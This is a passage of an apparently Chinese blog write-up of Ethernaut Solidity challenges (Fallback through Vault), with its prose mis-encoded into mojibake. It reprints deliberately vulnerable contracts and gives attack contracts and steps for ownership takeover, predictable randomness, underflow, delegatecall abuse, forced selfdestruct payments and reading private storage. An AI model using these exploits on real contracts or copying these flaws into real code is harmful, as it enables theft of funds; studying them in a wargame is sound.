class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Fallback &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) public contributions;</span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">        require(</span><br><span class="line">            msg.sender == owner,</span><br><span class="line">            &quot;caller is not the owner&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  function contribute() public payable &#123;</span><br><span class="line">    require(msg.value &lt; 0.001 ether);</span><br><span class="line">    contributions[msg.sender] += msg.value;</span><br><span class="line">    if(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">      owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getContribution() public view returns (uint) &#123;</span><br><span class="line">    return contributions[msg.sender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw() public onlyOwner &#123;</span><br><span class="line">    payable(owner).transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›®æ ‡ï¼š</p><ul><li>æˆä¸ºowner</li><li>æ¸…ç©ºåˆçº¦è´¦æˆ·</li></ul><p>å¯ä»¥çœ‹åˆ°åœ¨withdrawå‡½æ•°å¯ä»¥ç›´æ¥è½¬èµ°åˆçº¦åœ°å€çš„ä½™é¢ï¼Œä½†æ˜¯è¦é¦–å…ˆæˆä¸ºownerï¼›åŒæ—¶ï¼Œæœ‰ä¸¤ä¸ªåœ°æ–¹å¯ä»¥æˆä¸ºownerï¼š</p><ol><li><p>contributeï¼Œä½†é™å®šäº†æ¯æ¬¡ä¼ å…¥çš„æ•°æ®ï¼Œè¦æ»¡è¶³æ¡ä»¶çš„è¯éœ€è¦æ‰§è¡Œ10^6æ¬¡</p></li><li><p>receiveï¼Œè¿™æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„å‡½æ•°ï¼Œå½“å‘åˆçº¦å‘é€æ•°æ®æ—¶ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚è€Œä¸”æ¡ä»¶åªéœ€è¦è®©ä¼ å…¥çš„æ•°æ®å’Œæ•°ç»„é‡Œçš„å€¼å¤§äº0å³å¯ã€‚åŒæ—¶ï¼Œå®˜æ–¹æ–‡æ¡£æ˜¯è¿™ä¹ˆæè¿°receiveçš„ï¼š</p><p><img src="/images/ethernaut/image-20230405230527117.png" alt="image-20230405230527117"></p><p>é‚£ä¹ˆæˆ‘ä»¬éœ€è¦æ‰§è¡Œçš„æ“ä½œå°±æ˜¯ï¼Œå…ˆè°ƒç”¨contributeä½¿å¾—contributions[msg.sender]&gt;0ï¼Œç„¶åå†å‘åˆçº¦å‘é€weiï¼Œå†è°ƒç”¨withdrawè½¬èµ°åˆçº¦ä½™é¢ã€‚</p><p>æ³¨æ„ï¼Œæˆ‘ä»¬å‘åˆçº¦å‘é€çš„å•ä½æ˜¯weiï¼Œè€Œé¢˜ä¸­çš„å•ä½ä¸ºetherï¼š</p><p><img src="/images/ethernaut/image-20230405230900958.png" alt="image-20230405230900958"></p><p>ä¿®æ”¹ownerï¼š</p><p><img src="/images/ethernaut/image-20230405230830479.png" alt="image-20230405230830479"></p></li></ol><p>å¯ä»¥çœ‹åˆ°ownerå·²ç»è¢«ä¿®æ”¹ï¼Œç„¶åå³å¯é€šå…³ã€‚</p><h1 id="Fallout"><a href="#Fallout" class="headerlink" title="Fallout"></a>Fallout</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;openzeppelin-contracts-06/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Fallout &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping (address =&gt; uint) allocations;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  /* constructor */</span><br><span class="line">  function Fal1out() public payable &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    allocations[owner] = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">        require(</span><br><span class="line">            msg.sender == owner,</span><br><span class="line">            &quot;caller is not the owner&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  function allocate() public payable &#123;</span><br><span class="line">    allocations[msg.sender] = allocations[msg.sender].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function sendAllocation(address payable allocator) public &#123;</span><br><span class="line">    require(allocations[allocator] &gt; 0);</span><br><span class="line">    allocator.transfer(allocations[allocator]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function collectAllocations() public onlyOwner &#123;</span><br><span class="line">    msg.sender.transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function allocatorBalance(address allocator) public view returns (uint) &#123;</span><br><span class="line">    return allocations[allocator];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¦æ±‚æ˜¯æˆä¸ºownerã€‚</p><p>è¿™å…³æ›´ç®€å•äº†ï¼Œç›´æ¥è°ƒç”¨Fal1outå°±è¡Œäº†ã€‚</p><p>åŸæ¥èƒŒæ™¯æ˜¯æœ‰ä¸€å®¶å…¬å¸æ”¹äº†åˆçº¦åä½†æ˜¯æ²¡æ”¹æ„é€ å‡½æ•°çš„åå­—ï¼ŒæŸå¤±++</p><h1 id="Coin-Flip"><a href="#Coin-Flip" class="headerlink" title="Coin Flip"></a><strong>Coin Flip</strong></h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line"></span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;</span><br><span class="line">    consecutiveWins = 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line"></span><br><span class="line">    if (lastHash == blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">    bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">    if (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      return true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      consecutiveWins = 0;</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›®æ ‡ï¼šçŒœå¯¹ç¡¬å¸10æ¬¡</p><p>exp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface CoinFlip&#123;</span><br><span class="line">    function flip(bool _guess) external returns(bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract attack&#123;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line">    CoinFlip interact;</span><br><span class="line"></span><br><span class="line">    constructor(address _address)&#123;</span><br><span class="line">        interact = CoinFlip(_address);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess() public &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool _guess = coinFlip == 1 ? true : false;   </span><br><span class="line">        interact.flip(_guess);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>äº¤äº’10æ¬¡å³å¯ã€‚</p><p>èƒŒæ™¯æŒ‡å‡ºåœ¨åŒºå—é“¾ä¸Šç”Ÿæˆéšæœºæ•°æ˜¯å¾ˆéš¾çš„ï¼Œå»ºè®®ç”¨<a href="https://docs.chain.link/docs/get-a-random-number">Chainlink VRF</a>ä¹‹ç±»çš„</p><h1 id="Telephone"><a href="#Telephone" class="headerlink" title="Telephone"></a><strong>Telephone</strong></h1><p>æºç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function changeOwner(address _owner) public &#123;</span><br><span class="line">    if (tx.origin != msg.sender) &#123;</span><br><span class="line">      owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›®æ ‡æ˜¯è¦æˆä¸ºåˆçº¦çš„ownerï¼Œè®©tx.origin != msg.senderæˆç«‹ã€‚</p><p>äºŒè€…çš„åŒºåˆ«:</p><ul><li>tx.originä¼šéå†æ•´ä¸ªè°ƒç”¨æ ˆå¹¶è¿”å›æœ€åˆå‘é€è°ƒç”¨ï¼ˆæˆ–äº¤æ˜“ï¼‰çš„å¸æˆ·çš„åœ°å€ã€‚</li><li>msg.senderä¸ºç›´æ¥è°ƒç”¨æ™ºèƒ½åˆçº¦åŠŸèƒ½çš„å¸æˆ·æˆ–æ™ºèƒ½åˆçº¦çš„åœ°å€</li></ul><p>ç®€å•çš„è¯´ï¼Œåªè¦å†™ä¸€ä¸ªåˆçº¦å»è°ƒç”¨changeOwnerå‡½æ•°ï¼Œé‚£ä¹ˆmsg.senderå°±ä¼šæ˜¯åˆçº¦åœ°å€ï¼Œè€Œtx.originä»ç„¶æ˜¯æˆ‘çš„è´¦æˆ·çš„åœ°å€ï¼Œå°±å¯ä»¥æ»¡è¶³åˆ¤æ–­ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Telephone&#123;</span><br><span class="line">    function changeOwner(address _owner) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract attack&#123;</span><br><span class="line">    Telephone tele;</span><br><span class="line">    constructor(address _address)&#123;</span><br><span class="line">        tele = Telephone(_address);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function atta() public&#123;</span><br><span class="line">        tele.changeOwner(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åšå®Œåé¢˜ç›®è¿˜ç»™äº†ä¸ªæ”»å‡»æ¡ˆä¾‹ï¼š</p><p><img src="/images/ethernaut/image-20230406112041546.png" alt="image-20230406112041546"></p><h1 id="Token"><a href="#Token" class="headerlink" title="Token"></a><strong>Token</strong></h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  constructor(uint _initialSupply) public &#123;</span><br><span class="line">    balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">    require(balances[msg.sender] - _value &gt;= 0);</span><br><span class="line">    balances[msg.sender] -= _value;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _owner) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸‹æº¢çš„æ´ï¼Œç›´æ¥è½¬è´¦å°±è¡Œã€‚</p><h1 id="Delegation"><a href="#Delegation" class="headerlink" title="Delegation"></a><strong>Delegation</strong></h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor(address _owner) &#123;</span><br><span class="line">    owner = _owner;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function pwn() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line">  Delegate delegate;</span><br><span class="line"></span><br><span class="line">  constructor(address _delegateAddress) &#123;</span><br><span class="line">    delegate = Delegate(_delegateAddress);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fallback() external &#123;</span><br><span class="line">    (bool result,) = address(delegate).delegatecall(msg.data);</span><br><span class="line">    if (result) &#123;</span><br><span class="line">      this;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€ƒå¯Ÿçš„æ˜¯delegationcall</p><ul><li><p>call: è°ƒç”¨åå†…ç½®å˜é‡ msg çš„å€¼ä¼šä¿®æ”¹ä¸º<strong>è°ƒç”¨è€…</strong>ï¼Œæ‰§è¡Œç¯å¢ƒä¸ºè¢«<strong>è°ƒç”¨è€…çš„è¿è¡Œç¯å¢ƒ</strong></p></li><li><p>delegatecall: è°ƒç”¨åå†…ç½®å˜é‡ msg çš„å€¼<strong>ä¸ä¼šä¿®æ”¹ä¸ºè°ƒç”¨è€…</strong>ï¼Œä½†æ‰§è¡Œç¯å¢ƒä¸º<strong>è°ƒç”¨è€…çš„è¿è¡Œç¯å¢ƒ</strong>ï¼ˆç›¸å½“äºå¤åˆ¶è¢«è°ƒç”¨è€…çš„ä»£ç åˆ°è°ƒç”¨è€…åˆçº¦ï¼‰</p></li><li><p>callcode: è°ƒç”¨åå†…ç½®å˜é‡ msg çš„å€¼ä¼šä¿®æ”¹ä¸ºè°ƒç”¨è€…ï¼Œä½†æ‰§è¡Œç¯å¢ƒä¸ºè°ƒç”¨è€…çš„è¿è¡Œç¯å¢ƒ</p><p>ç”±äºæ‰§è¡Œç¯å¢ƒæ˜¯è°ƒç”¨è€…ï¼ˆDelegationï¼‰çš„ç¯å¢ƒï¼Œæ‰€ä»¥pwn()è°ƒç”¨åï¼Œä¿®æ”¹çš„æ˜¯Delegationçš„owner=msg.senderï¼Œåˆå› ä¸ºä¸ä¼šæ”¹msg.senderï¼Œæ‰€ä»¥Delegationçš„ownerå˜æˆäº†æˆ‘ä»¬çš„è´¦æˆ·åœ°å€ã€‚</p></li></ul><p>å‚æ•°å¯ä»¥æœ¬åœ°ç®—ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract test&#123;</span><br><span class="line">    function func() public view returns (bytes4)&#123;</span><br><span class="line">        return bytes4(keccak256(&quot;pwn()&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">#0xdd365b8b</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥åœ¨jsé‡Œç®—<code>web3.utils.keccak256(&quot;pwn()&quot;).slice(0, 10)</code>ï¼š</p><p><img src="../images/ethernaut/image-20230406114824062.png" alt="image-20230406114824062"></p><p>ä¸ºä»€ä¹ˆæ˜¯sliceå‰åä¸ªï¼š</p><ol><li>ä¸ºä»€ä¹ˆè¦å†™web3.utils.keccak256()ï¼Ÿè¿™é‡Œé¢æœ‰ä¸¤ä¸ªé—®é¢˜ï¼Œç¬¬ä¸€ï¼Œå†™keccak()å¿…é¡»è¦åŠ ä¸Šå‰é¢çš„web3.utilsï¼Œæ‰èƒ½å¼•å…¥keccak()æ–¹æ³•ã€‚ç¬¬äºŒï¼Œkeccak()æ˜¯ä¸€ç§è¢«é€‰å®šä¸ºSHA-3æ ‡å‡†çš„å•å‘æ•£åˆ—å‡½æ•°ç®—æ³•ï¼Œå¤§æ¦‚æ˜¯ä¸€ä¸ªæµ·ç»µä½“ç»“æ„ï¼Œæœ‰å¸å…¥å’ŒæŒ¤å‡ºé˜¶æ®µã€‚</li><li>ä¸ºä»€ä¹ˆç”¨slice(0,10)ï¼Ÿä»¥ä¸‹è¡¥å……ä¸€äº›solidityçš„å‡½æ•°é€‰æ‹©å™¨çŸ¥è¯†ã€‚</li></ol><p><strong>å‡½æ•°é€‰æ‹©å™¨çŸ¥è¯†è¡¥å……ï¼š</strong></p><p>ä¸€ä¸ªå‡½æ•°<strong>è°ƒç”¨æ•°æ®çš„å‰ 4 å­—èŠ‚</strong>ï¼ŒæŒ‡å®šäº†è¦è°ƒç”¨çš„å‡½æ•°ã€‚ è¿™å°±æ˜¯æŸä¸ªå‡½æ•°ç­¾åçš„ Keccak å“ˆå¸Œçš„å‰ 4 å­—èŠ‚ï¼ˆé«˜ä½åœ¨å·¦çš„å¤§ç«¯åºï¼‰ã€‚</p><p>ï¼ˆä½†æ˜¯ä¼ å…¥çš„æ•°æ®ä»ç„¶éœ€è¦å‰10ä¸ªæ‰èƒ½è¢«æ­£ç¡®è§£æï¼‰</p><p><img src="/images/ethernaut/image-20230406115805637.png" alt="image-20230406115805637"></p><p><img src="/images/ethernaut/image-20230406115819488.png" alt="image-20230406115819488"></p><p>åè®°ï¼š <a href="https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7">The Parity Wallet Hack Explained</a>ä»‹ç»äº†ä¸€ä¸ªæ”»å‡»æ¡ˆä¾‹</p><h1 id="Force"><a href="#Force" class="headerlink" title="Force"></a>Force</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Force &#123;/*</span><br><span class="line"></span><br><span class="line">                   MEOW ?</span><br><span class="line">         /\_/\   /</span><br><span class="line">    ____/ o o \</span><br><span class="line">  /~____  =Ã¸= /</span><br><span class="line"> (______)__m_m)</span><br><span class="line"></span><br><span class="line">*/&#125;</span><br></pre></td></tr></table></figure><p>ç›®æ ‡æ˜¯å¼ºè¡Œå‘åˆçº¦è½¬è´¦ï¼Œè€ƒç‚¹ä¸ºselfdestructï¼š</p><p>selfdestructå‡½æ•°æ˜¯ä¸€ä¸ªè‡ªæ¯å‡½æ•°ï¼Œå½“è°ƒç”¨å®ƒæ—¶ï¼Œå®ƒä¼šä½¿è¯¥åˆçº¦æ— æ•ˆåŒ–å¹¶åˆ é™¤è¯¥åœ°å€çš„å­—èŠ‚ç ï¼Œç„¶åå®ƒä¼šæŠŠåˆçº¦é‡Œå‰©ä½™çš„èµ„é‡‘å‘é€ç»™å‚æ•°æ‰€æŒ‡å®šçš„åœ°å€ï¼Œæ¯”è¾ƒç‰¹æ®Šçš„æ˜¯è¿™ç¬”èµ„é‡‘çš„å‘é€å°†æ— è§†åˆçº¦çš„fallbackå‡½æ•°</p><p>exp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract test&#123;</span><br><span class="line">    constructor()  payable&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    function attack(address payable _addr) public&#123;</span><br><span class="line">        selfdestruct(_addr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åè®°ï¼š</p><p><img src="/images/ethernaut/image-20230406171745559.png" alt="image-20230406171745559"></p><h1 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">  bool public locked;</span><br><span class="line">  bytes32 private password;</span><br><span class="line"></span><br><span class="line">  constructor(bytes32 _password) &#123;</span><br><span class="line">    locked = true;</span><br><span class="line">    password = _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function unlock(bytes32 _password) public &#123;</span><br><span class="line">    if (password == _password) &#123;</span><br><span class="line">      locked = false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›®æ ‡æ˜¯æŠŠlockedè®¾ä¸ºfalseï¼Œé‚£ä¹ˆéœ€è¦å¾—åˆ°password</p><p>å°½ç®¡passwordè®¾ä¸ºprivateï¼Œä½†è¿™åªæ˜¯é™åˆ¶å¤–éƒ¨åˆçº¦è®¿é—®è¿™ä¸ªå˜é‡ï¼Œæ•°æ®ä¿å­˜åœ¨åŒºå—é“¾ä¸Šæ˜¯é€æ˜çš„ï¼Œå¯ä»¥ç›´æ¥ç”¨getStorageAtå‡½æ•°è·å–:</p><p><code>web3.eth.getStorageAt(contract.address, 1, function(x, y) &#123;alert(y)&#125;);</code></p><p><img src="/images/ethernaut/image-20230406174556548.png" alt="image-20230406174556548"></p><p>æŠŠæ•°æ®æ”¾è¿›remixé‡Œå°±èƒ½ç›´æ¥è§£æå‡ºæ¥<img src="/images/ethernaut/image-20230406174623483.png" alt="image-20230406174623483"></p><p>åè®°ï¼š</p><p><img src="/images/ethernaut/image-20230406175010825.png" alt="image-20230406175010825"></p><h1 id="King"><a href="#King" class="headerlink" title="King"></a><strong>King</strong></h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: 